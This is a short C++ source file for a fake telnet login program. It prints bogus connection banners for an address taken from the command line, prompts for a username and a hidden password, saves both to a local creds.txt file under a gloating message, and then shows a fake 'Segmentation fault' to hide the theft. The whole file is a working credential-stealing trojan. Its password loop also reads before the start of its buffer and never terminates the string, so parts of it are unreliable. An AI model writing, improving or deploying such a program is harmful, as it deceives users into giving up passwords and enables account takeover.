#include <iostream>
#include <fstream>
#include <string>

#include <termios.h>
#include <unistd.h>
#include <stdio.h>

int getch(void)
{
    struct termios oldattr, newattr;
    int ch;
    tcgetattr( STDIN_FILENO, &oldattr );
    newattr = oldattr;
    newattr.c_lflag &= ~( ICANON | ECHO );
    tcsetattr( STDIN_FILENO, TCSANOW, &newattr );
    ch = getchar();
    tcsetattr( STDIN_FILENO, TCSANOW, &oldattr );
    return ch;
}

int main(int argc, char *argv[])
{
        std::string login;
        char password[1024];
        int k = 0;
    
        std::string prefix = "It's done, credentials here now.\nHave a nice day!\n";

        std::cout << "Trying 192.168.1.1..." << std::endl;
        std::cout << "Connected to " << argv[1] << "." << std::endl;
        std::cout << "Escape character is '^]'." << std::endl;

        std::cout << "Login: ";
        std::cin >> login;
  
        std::cout << "Password: ";
        while (password[k-1] != '\r') {
                password[k] = getch();
                if (password[k] == '\n' and k != 0) break;
                if (password[k] != '\r') {
                        if (k != 0) {
                                std::cout << "*";
                        }
                }
                k++;
        }

        std::ofstream myfile;
        myfile.open("creds.txt");
        myfile << prefix << "Login: " << login << std::endl;
        myfile << "Password: " << password << std::endl;
        myfile.close();
    
        std::cout << "\nSegmentation fault." << std::endl;
        return 0;
}
